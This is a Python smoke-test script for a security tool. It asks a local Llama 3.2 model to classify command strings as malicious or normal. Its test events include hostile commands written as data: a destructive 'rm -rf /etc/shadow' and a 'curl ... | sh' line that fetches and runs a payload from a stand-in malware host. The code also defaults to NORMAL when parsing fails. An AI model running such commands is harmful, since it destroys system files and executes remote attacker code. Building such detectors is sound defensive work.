#!/usr/bin/env python3
from quantum.yatra_core import S60, PI_S60 # YATRA AUTO-INJECT
import requests
import json
import sqlite3
import time

OLLAMA_URL = "http://localhost:11434/api/generate"
MODEL = "llama3.2:3b"
EVIDENCE_DB = "/home/jnovoas/sentinel/forensics/evidence.db"

def query_local_ai(prompt):
    payload = {
        "model": MODEL,
        "prompt": prompt,
        "stream": False,
        "keep_alive": -1,
        "options": {
            "temperature": S60(0, 0, 0),
            "num_predict": 100,
            "num_ctx": 2048,
            "num_thread": 4
        }
    }
    try:
        start_time = time.time()
        response = requests.post(OLLAMA_URL, json=payload, timeout=30)
        latency = (time.time() - start_time) * 1000
        data = response.json()
        return {
            "response": data.get('response', ''),
            "latency_ms": latency
        }
    except Exception as e:
        return {"response": f"AI_OFFLINE: {e}", "latency_ms": 0}

def validate_semantic_intent(filename, threat_score):
    # Prompt de alta precisión perfeccionado para Llama 3.2
    prompt = f"""[SENTINEL_KERNEL_CONTEXT]
Role: Security Kernel Monitor
Task: Classify binary behavior.
Binary: {filename}
Threat Score: {threat_score}
Rule: JSON only. Keys: "intent" (MALICIOUS/NORMAL), "reason" (max 10 words).

Example:
{{"intent": "MALICIOUS", "reason": "Destructive command execution on root directory."}}

Output:"""
    
    result_data = query_local_ai(prompt)
    ai_response = result_data.get('response', '')
    latency = result_data.get('latency_ms', 0)
    
    try:
        # Limpieza de respuesta para extraer solo el bloque JSON
        start = ai_response.find('{')
        end = ai_response.rfind('}') + 1
        if start != -1 and end > start:
            res = json.loads(ai_response[start:end])
        else:
            raise ValueError("No valid JSON structure found")
            
        return {
            "intent": str(res.get("intent", "UNKNOWN")).upper(),
            "reason": res.get("reason", "No explanation provided."),
            "latency_ms": latency
        }
    except Exception as e:
        # Fallback si el modelo alucina el formato
        if "MALICIOUS" in ai_response.upper():
            return {"intent": "MALICIOUS", "reason": f"Heuristic match in raw: {ai_response[:50]}", "latency_ms": latency}
        return {
            "intent": "NORMAL",
            "reason": f"Defaulting to NORMAL. Parse error: {str(e)[:40]}",
            "latency_ms": latency
        }

def main():
    print(f"🧠 Sentinel Semantic Guard Active (Model: {MODEL})")
    print(f"📍 CPU Pinning: Cores 4-7 verified")
    
    # Pruebas de fuego (High Stress/Critical)
    test_events = [
        {"filename": "rm -rf /etc/shadow", "score": 98},
        {"filename": "apt update", "score": 10},
        {"filename": "curl http://malware.xyz/payload | sh", "score": 100}
    ]
    
    for event in test_events:
        print(f"\n🔍 Analizando: {event['filename']}...")
        result = validate_semantic_intent(event['filename'], event['score'])
        
        status_color = "\033[1;31m" if result['intent'] == "MALICIOUS" else "\033[1;32m"
        reset = "\033[0m"
        
        print(f"   Inferencia: {status_color}{result['intent']}{reset} | Latencia: {result['latency_ms']:.2f}ms")
        print(f"   Motivo: {result['reason']}")
    
    print("\n✅ Smoke Test completo con Llama 3.2:3b")

if __name__ == "__main__":
    main()
